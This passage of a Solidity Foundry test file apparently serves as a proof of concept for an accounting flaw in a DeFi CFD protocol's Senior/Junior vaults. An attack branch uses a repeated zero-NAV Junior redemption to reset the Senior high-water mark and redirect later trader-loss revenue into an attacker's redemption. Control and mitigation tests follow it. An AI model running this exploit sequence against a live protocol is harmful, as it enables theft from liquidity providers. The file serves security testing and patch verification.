        assertEq(control.attackerPayout, 0, "matched control refunds the same Junior redemption request");
        assertEq(attack.attackerWallet, attack.attackerPayout, "redeemed USDG is transferred to the attacker's wallet");
        assertEq(attack.pendingRedeemShares, attack.juniorEscrowShares,
            "remaining shares stay in the attacker's controller-owned redemption request");
        assertGt(attack.pendingRedeemQuote, 0, "unfunded request still represents Junior NAV");
        assertGt(attack.attackerInvestment, attack.attackerPayout + attack.pendingRedeemQuote,
            "attacker is not shown as net-profitable after its pre-crisis LP investment");
        assertEq(attack.pendingRecap, 0, "attack branch clears the residual recap intent");
        assertEq(control.pendingRecap, 0, "control settles recap intent only from new backing");
        assertEq(attack.unassigned, 0, "attack branch never routes value to unassigned assets");
        assertEq(control.unassigned, 0, "control branch never routes value to unassigned assets");
        assertEq(attack.poolAssets + attack.attackerPayout + attack.juniorEscrowAssets,
            control.poolAssets + control.attackerPayout + control.juniorEscrowAssets,
            "pool plus escrowed and claimed LP value is conserved across matched branches");
        assertGt(attack.attackerPayout, 0, "transfer is real value, not only an HWM field change");
    }

    function test_MitigationPreservesSeniorHwmAcrossResidualRecapReplay() public {
        (uint256 recapSlice, uint256 governanceRecap, uint256 attackerInvestment) = _preparePartialRecoveryState();
        uint256 startTime = block.timestamp;

        uint256 cooldown = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldown) vm.warp(cooldown);
        uint256 emptyShares = juniorVault.maxRequestRedeem(ATTACKER);
        uint256 emptyRequest = _requestRedeemAllJunior(ATTACKER);
        _warpToRequestMaturity(emptyRequest);
        _settleLpThroughRouter(ATTACKER, 0.5e8);
        assertEq(juniorVault.refundableRedeemRequest(emptyRequest, ATTACKER), emptyShares,
            "second zero-NAV redemption is refunded through public epoch progress");
        _claimRedeemRefund(ATTACKER, emptyRequest);

        assertEq(pool.totalAssets(), recapSlice, "the empty settlement moves no cash");
        assertEq(pool.seniorPrincipal(), recapSlice, "existing Senior backing is preserved");
        assertEq(pool.seniorHighWaterMark(), governanceRecap, "residual recap cannot reset Senior HWM");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "the backed recap residual settles without lowering HWM");
        assertEq(pool.juniorPrincipal(), 0, "Junior remains zero before new revenue");
        _logAccountingState("PATCHED_AFTER_SECOND_ZERO_NAV_SETTLEMENT");

        uint256 lossTime = startTime + 4 hours;
        if (block.timestamp < lossTime) vm.warp(lossTime);
        uint256 revenue = _realizedTraderLoss("PATCHED_AFTER_TRADER_LOSS");
        assertGt(revenue, recapSlice / 4, "same ordinary trader loss exceeds the deployed Senior covenant floor");

        cooldown = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldown) vm.warp(cooldown);
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        _warpToRequestMaturity(redeemId);
        _settleLpThroughRouter(ATTACKER, 0.25e8);
        assertEq(juniorVault.refundableRedeemRequest(redeemId, ATTACKER), shares,
            "patched control has no Junior claim after the same trader loss");
        _claimRedeemRefund(ATTACKER, redeemId);

        assertEq(pool.seniorPrincipal(), recapSlice + revenue, "new cash restores Senior toward its original HWM");
        assertEq(pool.seniorHighWaterMark(), governanceRecap, "losses and the public redemption preserve HWM");
        assertEq(pool.juniorPrincipal(), 0, "patched recovery diverts no trader loss to Junior");
        assertEq(pool.pendingRecapitalizationAssets(), 0, "no residual recap is left after preserving its HWM target");
        assertEq(pool.unassignedAssets(), 0, "legitimate Senior recovery remains claimant-owned");
        assertEq(pool.totalAssets(), recapSlice + revenue, "patch conserves all Pool backing");
        assertEq(attackerInvestment, 1_000_000e6, "attacker's original LP cost is identical to the exploit branch");
        _logAccountingState("PATCHED_FINAL_CONTROL");
    }

    function _preparePartialRecoveryState()
        internal
        returns (uint256 recapSlice, uint256 governanceRecap, uint256 attackerInvestment)
    {
        attackerInvestment = 1_000_000e6;
        _fundJuniorThroughProductionQueue(ATTACKER, attackerInvestment);
        _fundSeniorThroughProductionQueue(address(this), 100_000e6);
        uint256 attackerSharesBeforeCrisis = juniorVault.balanceOf(ATTACKER);
        assertGt(attackerSharesBeforeCrisis, 0, "attacker's shares are acquired before the crisis");
        assertEq(pool.maxSeniorShareBps(), 8_000, "test uses the deployed Senior share covenant");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "test uses the deployed Senior exposure cap");
        _logAccountingState("PRE_CRISIS");

        // MockPyth supplies six deployment basket observations at the target index values. They model external market
        // reports; attacker actions never set or sign a price. The position sizes satisfy release skew and solvency.
        _fundTrader(SHORT_A, 500_000e6);
        _fundTrader(SHORT_B, 750_000e6);
        _fundTrader(LONG_A, 1_100_000e6);
        _fundTrader(LONG_B, 300_000e6);

        _openV3(SHORT_A, CfdTypes.Side.SHORT, 440_000e18, 300_000e6, 1e8);
        _openV3(LONG_A, CfdTypes.Side.LONG, 880_000e18, 950_000e6, 1e8);
        _openV3(SHORT_B, CfdTypes.Side.SHORT, 650_000e18, 600_000e6, 1e8);
        _openV3(LONG_B, CfdTypes.Side.LONG, 210_000e18, 250_000e6, 1e8);

        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claims before closes");
        assertFalse(engine.degradedMode(), "all four opens satisfy live solvency admission");
        assertEq(engine.lastMarkPrice(), 1e8, "Router-bound mark is the opened price");

        uint256 poolBeforeProfitableCloses = pool.totalAssets();
        productionRouter.updateMarkPrice(_releasePythUpdateData(2e8));
        assertFalse(engineLens.previewLiquidation(LONG_A, 2e8).liquidatable,
            "long A is collateralized through the temporary adverse peak and needs no forced liquidation");
        assertFalse(engineLens.previewLiquidation(LONG_B, 2e8).liquidatable,
            "long B is collateralized through the temporary adverse peak and needs no forced liquidation");
        _closeV3(SHORT_A, CfdTypes.Side.SHORT, 440_000e18, 2e8);
        _closeV3(SHORT_B, CfdTypes.Side.SHORT, 650_000e18, 2e8);
        uint256 poolAfterShortPayouts = pool.totalAssets();
        assertTrue(engine.degradedMode(), "paid short profits exhaust backing for the remaining long liability");
        assertGt(poolBeforeProfitableCloses, poolAfterShortPayouts, "short profit is paid from real Pool cash");
        _logAccountingState("AFTER_SHORT_WINNER_PAYOUTS");

        uint256 shortProfitA = clearinghouse.balanceAssets(SHORT_A);
        uint256 shortProfitB = clearinghouse.balanceAssets(SHORT_B);
        assertGt(shortProfitA, 0, "short A receives its realized Pool payout");
        assertGt(shortProfitB, 0, "short B receives its realized Pool payout");

        // A 2.0 -> 0.5 observed market reversal makes the already-open longs profitable.
        // Their accounts were funded enough to remain above maintenance at 2.0, so liquidation is not required.
        _closeV3(LONG_A, CfdTypes.Side.LONG, 880_000e18, 0.5e8);
        _closeV3(LONG_B, CfdTypes.Side.LONG, 210_000e18, 0.5e8);
        assertTrue(engine.degradedMode(), "degraded mode remains latched until governance clears it");
        uint256 totalClaim = engine.totalTraderClaimBalanceAssets();
        assertGt(totalClaim, 0, "short profits become actual unpaid trader claims");
        assertFalse(engine.terminalNavSnapshot().hasOpenPositions, "all positions are closed");
        _logAccountingState("AFTER_TRADER_CLAIMS_RECORDED");

        // Governance's authorized recap funds claim settlement and a deliberately partial LP recovery.
        // Let c be Pool cash and C be outstanding claims. Funding 2(C-c) leaves C-c after claims are paid.
        // This is the state needed to test partial recapitalization; it is not an attacker action.
        uint256 cashBeforeRecap = pool.totalAssets();
        assertGt(totalClaim, cashBeforeRecap, "short claims exceed remaining Pool cash");
        recapSlice = totalClaim - cashBeforeRecap;
        governanceRecap = 2 * recapSlice;
        settlementToken.mint(address(this), governanceRecap);
        settlementToken.approve(address(engine), governanceRecap);
        engine.recapitalizePool(governanceRecap);
        assertEq(pool.pendingRecapitalizationAssets(), governanceRecap, "owner recap is pending claimant intent");
        _logAccountingState("AFTER_GOVERNANCE_RECAP");

        vm.prank(LONG_A);
        engine.settleTraderClaim(LONG_A);
        vm.prank(LONG_B);
        engine.settleTraderClaim(LONG_B);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "claimants settle their own claims");
        assertEq(pool.totalAssets(), recapSlice, "claim settlement leaves the matched backing slice in Pool cash");
        _logAccountingState("AFTER_TRADER_CLAIMS_SETTLED");
        assertTrue(engine.degradedMode(), "claim payment does not clear the containment latch");
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "owner clears degraded mode after all positions and claims are gone");
        assertFalse(pool.paused(), "HousePool deposits are not paused");
        assertFalse(pool.lpEpochSettlementPaused(), "LP epoch settlement is not paused");

        // Matured all-share zero-NAV redemption performs the first partial recap through public Router settlement.
        uint256 attackerCooldown = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < attackerCooldown) vm.warp(attackerCooldown);
        uint256 firstRequest = _requestRedeemAllJunior(ATTACKER);
        _warpToRequestMaturity(firstRequest);
        _settleLpThroughRouter(ATTACKER, 0.5e8);
        assertEq(juniorVault.refundableRedeemRequest(firstRequest, ATTACKER), attackerSharesBeforeCrisis,
            "zero-NAV matured redemption is refunded and counts as epoch progress");
        _claimRedeemRefund(ATTACKER, firstRequest);
        assertEq(pool.seniorPrincipal(), recapSlice, "first settlement backs only remaining Pool cash");
        assertEq(pool.seniorHighWaterMark(), governanceRecap, "empty Senior bootstrap records the full recap target");
        assertEq(pool.pendingRecapitalizationAssets(), recapSlice, "residual recap bucket remains pending after partial settlement");
        assertEq(pool.juniorPrincipal(), 0, "Junior remains wiped after partial recovery");
        assertEq(pool.unassignedAssets(), 0, "this HWM case does not use unassigned assets");
        _logAccountingState("AFTER_FIRST_PARTIAL_RECAP");

    }

    function _fundJuniorThroughProductionQueue(address investor, uint256 amount) internal {
        settlementToken.mint(investor, amount);
        vm.startPrank(investor);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, investor, investor);
        vm.stopPrank();
        _warpToRequestMaturity(requestId);
        _settleLpThroughRouter(investor, 1e8);
        assertEq(juniorVault.claimableDepositRequest(requestId, investor), amount, "matured public deposit is claimable");
        vm.prank(investor);
        juniorVault.claimDeposit(requestId, amount, investor, investor);
    }

    function _fundSeniorThroughProductionQueue(address investor, uint256 amount) internal {
        settlementToken.mint(investor, amount);
        vm.startPrank(investor);
        settlementToken.approve(address(seniorVault), amount);
        uint256 requestId = seniorVault.requestDeposit(amount, investor, investor);
        vm.stopPrank();
        _warpToRequestMaturity(requestId);
        _settleLpThroughRouter(investor, 1e8);
        assertEq(seniorVault.claimableDepositRequest(requestId, investor), amount,
            "matured public Senior deposit is claimable");
        vm.prank(investor);
        seniorVault.claimDeposit(requestId, amount, investor, investor);
    }

    function _releaseFeedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        ids[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        ids[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        ids[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        ids[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        ids[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseWeights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _releaseBasePrices() internal pure returns (uint256[] memory bases) {
        bases = new uint256[](6);
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
    }

    function _releaseInversions() internal pure returns (bool[] memory inverted) {
        inverted = new bool[](6);
        inverted[1] = true;
        inverted[3] = true;
        inverted[4] = true;
        inverted[5] = true;
    }

    function _releasePythUpdateData(uint256 basketPrice) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = productionRouter.nextExecuteId();
        if (nextOrderId != 0) {
            OrderV3Types.PendingIntent memory pending = productionRouter.lifecycleBook().pendingIntent(nextOrderId);
            uint256 firstPostCommitTick = uint256(pending.timing.commitTimestamp) + 1;
            if (pending.account != address(0) && firstPostCommitTick <= publishTime) {
                publishTime = firstPostCommitTick;
            }
        }
        bytes32[] memory ids = _releaseFeedIds();
        uint256[] memory bases = _releaseBasePrices();
        bool[] memory inverted = _releaseInversions();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint256 rawPrice = inverted[i]
                ? 1e24 / (bases[i] * basketPrice)
                : (bases[i] * basketPrice) / 1e8;
            require(rawPrice != 0 && rawPrice <= uint256(uint64(type(int64).max)), "FX feed price outside int64");
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(rawPrice)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
        MockPyth.FeedUpdate[] memory decoded = abi.decode(updateData[0], (MockPyth.FeedUpdate[]));
        assertEq(decoded.length, ids.length, "encoded release Pyth basket includes every configured feed");
        for (uint256 i; i < decoded.length; ++i) {
            assertEq(decoded[i].id, ids[i], "encoded release Pyth feed id matches its basket slot");
            assertEq(decoded[i].price.publishTime, publishTime, "encoded release Pyth time matches the current update");
        }
    }

    function _openV3(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 price) internal {
        productionRouter.updateMarkPrice(_releasePythUpdateData(price));
        OrderV3Types.OrderRequest memory request = _request(trader, side, size, margin, price, false);
        vm.prank(trader);
        uint64 orderId = productionRouter.commitOrder(request);
        bytes[] memory executionUpdate = _releasePythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = productionRouter.executeOrder(orderId, executionUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "production V3 open executes");
        (uint256 positionSize,,,,,,) = engine.positions(trader);
        assertEq(positionSize, size, "open position matches the V3 request");
    }

    function _closeV3(address trader, CfdTypes.Side side, uint256 size, uint256 price) internal {
        productionRouter.updateMarkPrice(_releasePythUpdateData(price));
        OrderV3Types.OrderRequest memory request = _request(trader, side, size, 0, price, true);
        vm.prank(trader);
        uint64 orderId = productionRouter.commitOrder(request);
        bytes[] memory executionUpdate = _releasePythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = productionRouter.executeOrder(orderId, executionUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "production V3 close executes");
        (uint256 positionSize,,,,,,) = engine.positions(trader);
        assertEq(positionSize, 0, "full close removes the trader position");
    }

    function _request(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint64 maxWindow = uint64(productionRouter.maxExecutionWindowSeconds());
        request.clientOrderId = keccak256(abi.encode(trader, productionRouter.nextCommitId(), isClose));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = price;
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp) + maxWindow,
            executionWindowSeconds: uint32(maxWindow),
            allowedExecutionModes: 7,
            expectedConfigHash: productionRouter.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _requestRedeemAllJunior(address account) internal returns (uint256 requestId) {
        uint256 shares = juniorVault.maxRequestRedeem(account);
        assertGt(shares, 0, "attacker has unlocked pre-crisis shares");
        vm.prank(account);
        requestId = juniorVault.requestRedeem(shares, account, account);
    }

    function _warpToRequestMaturity(uint256 requestId) internal {
        uint256 maturity = pool.lpEpochStart(requestId);
        if (block.timestamp < maturity) vm.warp(maturity);
    }

    function _settleLpThroughRouter(address caller, uint256 observedPrice) internal {
        assertFalse(pool.paused(), "pool entry pause is off");
        assertFalse(pool.lpEpochSettlementPaused(), "LP settlement pause is off");
        assertFalse(OrderRouterAdmin(productionRouter.admin()).paused(), "Router order pause does not disable LP settlement");
        assertFalse(engine.degradedMode(), "LP settlement is only reached after authorized recovery is complete");
        assertFalse(engine.terminalNavSnapshot().hasOpenPositions, "no position-bound mark gate remains during settlement");
        bytes[] memory updateData = _releasePythUpdateData(observedPrice);
        vm.prank(caller);
        productionRouter.settleLpEpoch(updateData);
        assertEq(engine.lastMarkPrice(), observedPrice, "public Router settlement records the oracle basket mark");
        assertEq(engine.lastMarkTime() / pool.LP_EPOCH_DURATION(), block.timestamp / pool.LP_EPOCH_DURATION(),
            "PoolReconcile mark is fresh for the matured epoch");
    }

    function _claimRedeemRefund(address account, uint256 requestId) internal {
        uint256 shares = juniorVault.refundableRedeemRequest(requestId, account);
        assertGt(shares, 0, "zero-NAV redemption reached its public refund path");
        vm.prank(account);
        juniorVault.claimRedeemRefund(requestId, account, account);
    }

    function _runAttackBranch(uint256 startTime, uint256 recapSlice, uint256 attackerInvestment)
        internal
        returns (Outcome memory outcome)
    {
        outcome.attackerInvestment = attackerInvestment;
        uint256 cooldownAt = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldownAt) vm.warp(cooldownAt);
        uint256 emptyRequest = _requestRedeemAllJunior(ATTACKER);
        _warpToRequestMaturity(emptyRequest);
        _settleLpThroughRouter(ATTACKER, 0.5e8);
        assertEq(pool.seniorPrincipal(), recapSlice, "empty epoch preserves actual Senior cash principal");
        assertEq(pool.seniorHighWaterMark(), recapSlice, "public zero-NAV redemption resets the HWM");
        assertEq(pool.totalAssets(), recapSlice, "empty settlement moves no Pool cash");
        _logAccountingState("AFTER_SECOND_ZERO_NAV_SETTLEMENT");
        _claimRedeemRefund(ATTACKER, emptyRequest);

        // Match the control timestamp before the exact same real trader loss.
        uint256 lossTime = startTime + 4 hours;
        if (block.timestamp < lossTime) vm.warp(lossTime);
        uint256 revenue = _realizedTraderLoss("ATTACK_AFTER_TRADER_LOSS");
        assertGt(revenue, recapSlice / 4, "new revenue exceeds the deployed 80% Senior covenant floor");

        uint256 cooldown = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldown) vm.warp(cooldown);
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        assertGt(shares, 0, "attacker can request all unlocked pre-crisis shares");
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        _warpToRequestMaturity(redeemId);
        _settleLpThroughRouter(ATTACKER, 0.5e8);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, ATTACKER);
        outcome.attackerRedeemRequestId = redeemId;
        outcome.claimableRedeemShares = claimableShares;
        assertGt(claimableShares, 0, "attack redemption is funded from Junior's diverted value");
        vm.prank(ATTACKER);
        outcome.attackerPayout = juniorVault.claimRedeem(redeemId, claimableShares, ATTACKER, ATTACKER);
        assertGt(outcome.attackerPayout, 0, "attacker receives real escrowed USDG");
        assertGt(juniorVault.balanceOf(address(juniorVault)), 0,
            "shares beyond the Senior covenant remain escrowed in the matured redemption queue");
        assertGt(attackerInvestment, outcome.attackerPayout, "payout remains below attacker's wiped LP cost basis");
        outcome = _captureOutcome(outcome);
    }

    function _runControlBranch(uint256 startTime, uint256 recapSlice, uint256 attackerInvestment)
        internal
        returns (Outcome memory outcome)
    {
        outcome.attackerInvestment = attackerInvestment;
        uint256 lossTime = startTime + 4 hours;
        if (block.timestamp < lossTime) vm.warp(lossTime);
        uint256 revenue = _realizedTraderLoss("CONTROL_AFTER_TRADER_LOSS");
        assertGt(revenue, recapSlice / 4, "same trader loss exceeds the deployed 80% Senior covenant floor");

        uint256 cooldown = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldown) vm.warp(cooldown);
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        assertGt(shares, 0, "control requests the same full pre-crisis share position");
        vm.prank(ATTACKER);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        outcome.attackerRedeemRequestId = redeemId;
        _warpToRequestMaturity(redeemId);
        _settleLpThroughRouter(ATTACKER, 0.5e8);
        assertEq(juniorVault.refundableRedeemRequest(redeemId, ATTACKER), shares,
            "control has no Junior NAV after the same trader loss");
        _claimRedeemRefund(ATTACKER, redeemId);
        outcome.attackerPayout = 0;
        assertGt(attackerInvestment, 0, "attacker held identical pre-crisis shares in control");
        outcome = _captureOutcome(outcome);
    }

    function _realizedTraderLoss(string memory label) internal returns (uint256 poolGain) {
        uint256 poolBefore = pool.totalAssets();
        _fundTrader(LOSS_TRADER, 200_000e6);
        _openV3(LOSS_TRADER, CfdTypes.Side.SHORT, 195_000e18, 190_000e6, 1e8);
        _closeV3(LOSS_TRADER, CfdTypes.Side.SHORT, 195_000e18, 0.25e8);
        uint256 claim = engine.traderClaimBalanceAssets(LOSS_TRADER);
        assertEq(claim, 0, "ordinary loser's loss is collected from their actual clearinghouse balance");
        poolGain = pool.totalAssets() - poolBefore;
        assertGt(poolGain, 0, "realized price loss and charges increase Pool cash");
        emit log_named_uint(string.concat(label, ".realizedPoolGain"), poolGain);
        emit log_named_uint(string.concat(label, ".lossTraderFinalSettlement"), clearinghouse.balanceAssets(LOSS_TRADER));
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claim remains in the revenue branch");
        assertFalse(engine.degradedMode(), "small ordinary loss leaves the recovered Pool solvent");
        _logAccountingState(label);
    }

    function _captureOutcome(Outcome memory outcome) internal view returns (Outcome memory) {
        outcome.senior = pool.seniorPrincipal();
        outcome.seniorHwm = pool.seniorHighWaterMark();
        outcome.junior = pool.juniorPrincipal();
        outcome.pendingRecap = pool.pendingRecapitalizationAssets();
        outcome.pendingRevenue = pool.pendingTradingRevenueAssets();
        outcome.unassigned = pool.unassignedAssets();
        outcome.poolAssets = pool.totalAssets();
        outcome.poolTokenBalance = settlementToken.balanceOf(address(pool));
        outcome.juniorEscrowAssets = settlementToken.balanceOf(address(juniorVault));
        outcome.juniorEscrowShares = juniorVault.balanceOf(address(juniorVault));
        outcome.seniorEscrowAssets = settlementToken.balanceOf(address(seniorVault));
        outcome.seniorShareQuote = seniorVault.estimateRedeemAssets(seniorVault.accruedTotalSupply());
        outcome.juniorShareQuote = juniorVault.estimateRedeemAssets(juniorVault.accruedTotalSupply());
        outcome.attackerShares = juniorVault.balanceOf(ATTACKER);
        outcome.pendingRedeemShares = outcome.attackerRedeemRequestId == 0
            ? 0
            : juniorVault.pendingRedeemRequest(outcome.attackerRedeemRequestId, ATTACKER);
        outcome.pendingRedeemQuote = juniorVault.estimateRedeemAssets(outcome.pendingRedeemShares);
        outcome.attackerWallet = settlementToken.balanceOf(ATTACKER);
        outcome.attackerClearinghouseBalance = clearinghouse.balanceAssets(ATTACKER);
        outcome.clearinghouseCustody = settlementToken.balanceOf(address(clearinghouse));
        outcome.totalTraderClaims = engine.totalTraderClaimBalanceAssets();
        outcome.accountedAssets = pool.accountedAssets();
        outcome.tokenSupply = settlementToken.totalSupply();
        outcome.longASettlement = clearinghouse.balanceAssets(LONG_A);
        outcome.longBSettlement = clearinghouse.balanceAssets(LONG_B);
        outcome.shortASettlement = clearinghouse.balanceAssets(SHORT_A);
        outcome.shortBSettlement = clearinghouse.balanceAssets(SHORT_B);
        outcome.shortAClaim = engine.traderClaimBalanceAssets(SHORT_A);
        outcome.shortBClaim = engine.traderClaimBalanceAssets(SHORT_B);
        outcome.lossTraderSettlement = clearinghouse.balanceAssets(LOSS_TRADER);
        outcome.lossTraderClaim = engine.traderClaimBalanceAssets(LOSS_TRADER);
        outcome.ownerBalance = settlementToken.balanceOf(address(this));
        return outcome;
    }

    function _logOutcome(string memory label, Outcome memory outcome) internal {
        emit log_named_uint(string.concat(label, ".seniorPrincipal"), outcome.senior);
        emit log_named_uint(string.concat(label, ".seniorHwm"), outcome.seniorHwm);
        emit log_named_uint(string.concat(label, ".juniorPrincipal"), outcome.junior);
        emit log_named_uint(string.concat(label, ".pendingRecap"), outcome.pendingRecap);
        emit log_named_uint(string.concat(label, ".pendingRevenue"), outcome.pendingRevenue);
        emit log_named_uint(string.concat(label, ".unassigned"), outcome.unassigned);
        emit log_named_uint(string.concat(label, ".poolAssets"), outcome.poolAssets);
        emit log_named_uint(string.concat(label, ".poolTokenBalance"), outcome.poolTokenBalance);
        emit log_named_uint(string.concat(label, ".juniorEscrowAssets"), outcome.juniorEscrowAssets);
        emit log_named_uint(string.concat(label, ".juniorEscrowShares"), outcome.juniorEscrowShares);
        emit log_named_uint(string.concat(label, ".seniorEscrowAssets"), outcome.seniorEscrowAssets);
        emit log_named_uint(string.concat(label, ".seniorShareQuote"), outcome.seniorShareQuote);
        emit log_named_uint(string.concat(label, ".juniorShareQuote"), outcome.juniorShareQuote);
        emit log_named_uint(string.concat(label, ".attackerPayout"), outcome.attackerPayout);
        emit log_named_uint(string.concat(label, ".attackerShares"), outcome.attackerShares);
        emit log_named_uint(string.concat(label, ".attackerInvestment"), outcome.attackerInvestment);
        emit log_named_uint(string.concat(label, ".attackerWallet"), outcome.attackerWallet);
        emit log_named_uint(string.concat(label, ".attackerClearinghouseBalance"), outcome.attackerClearinghouseBalance);
        emit log_named_uint(string.concat(label, ".attackerRedeemRequestId"), outcome.attackerRedeemRequestId);
        emit log_named_uint(string.concat(label, ".claimableRedeemSharesAtFunding"), outcome.claimableRedeemShares);
        emit log_named_uint(string.concat(label, ".pendingRedeemShares"), outcome.pendingRedeemShares);
        emit log_named_uint(string.concat(label, ".pendingRedeemQuote"), outcome.pendingRedeemQuote);
        emit log_named_uint(string.concat(label, ".clearinghouseCustody"), outcome.clearinghouseCustody);
        emit log_named_uint(string.concat(label, ".totalTraderClaims"), outcome.totalTraderClaims);
        emit log_named_uint(string.concat(label, ".accountedAssets"), outcome.accountedAssets);
        emit log_named_uint(string.concat(label, ".tokenSupply"), outcome.tokenSupply);
        emit log_named_uint(string.concat(label, ".longASettlement"), outcome.longASettlement);
        emit log_named_uint(string.concat(label, ".longBSettlement"), outcome.longBSettlement);
        emit log_named_uint(string.concat(label, ".shortASettlement"), outcome.shortASettlement);
        emit log_named_uint(string.concat(label, ".shortBSettlement"), outcome.shortBSettlement);
        emit log_named_uint(string.concat(label, ".shortAClaim"), outcome.shortAClaim);
        emit log_named_uint(string.concat(label, ".shortBClaim"), outcome.shortBClaim);
        emit log_named_uint(string.concat(label, ".lossTraderSettlement"), outcome.lossTraderSettlement);
        emit log_named_uint(string.concat(label, ".lossTraderClaim"), outcome.lossTraderClaim);
        emit log_named_uint(string.concat(label, ".ownerBalance"), outcome.ownerBalance);
    }

    function _logAccountingState(string memory label) internal {
        (uint256 longMaxProfit,,,) = engine.sides(0);
        (uint256 shortMaxProfit,,,) = engine.sides(1);
        ICfdEngineTypes.TerminalNavSnapshot memory terminal = engine.terminalNavSnapshot();
        emit log_named_uint(string.concat(label, ".poolAssets"), pool.totalAssets());
        emit log_named_uint(string.concat(label, ".rawPoolTokenBalance"), settlementToken.balanceOf(address(pool)));
        emit log_named_uint(string.concat(label, ".accountedAssets"), pool.accountedAssets());
        assertEq(pool.accountedAssets(), settlementToken.balanceOf(address(pool)), "recognized Pool assets equal raw custody");
        emit log_named_uint(string.concat(label, ".seniorPrincipal"), pool.seniorPrincipal());
        emit log_named_uint(string.concat(label, ".seniorHwm"), pool.seniorHighWaterMark());
        emit log_named_uint(string.concat(label, ".juniorPrincipal"), pool.juniorPrincipal());
        emit log_named_uint(string.concat(label, ".pendingRecap"), pool.pendingRecapitalizationAssets());
        emit log_named_uint(string.concat(label, ".pendingRevenue"), pool.pendingTradingRevenueAssets());
        emit log_named_uint(string.concat(label, ".unassigned"), pool.unassignedAssets());
        emit log_named_uint(string.concat(label, ".traderClaims"), engine.totalTraderClaimBalanceAssets());
        emit log_named_uint(string.concat(label, ".maxLongLiability"), longMaxProfit);
        emit log_named_uint(string.concat(label, ".maxShortLiability"), shortMaxProfit);
        emit log_named_uint(string.concat(label, ".degradedMode"), engine.degradedMode() ? 1 : 0);
        emit log_named_uint(string.concat(label, ".hasOpenPositions"), terminal.hasOpenPositions ? 1 : 0);
        emit log_named_uint(string.concat(label, ".routerMarkPrice"), engine.lastMarkPrice());
        emit log_named_uint(string.concat(label, ".routerMarkTime"), engine.lastMarkTime());
        emit log_named_uint(string.concat(label, ".clearinghouseCustody"), settlementToken.balanceOf(address(clearinghouse)));
        emit log_named_uint(string.concat(label, ".juniorVaultEscrowAssets"), settlementToken.balanceOf(address(juniorVault)));
        emit log_named_uint(string.concat(label, ".seniorShareSupply"), seniorVault.accruedTotalSupply());
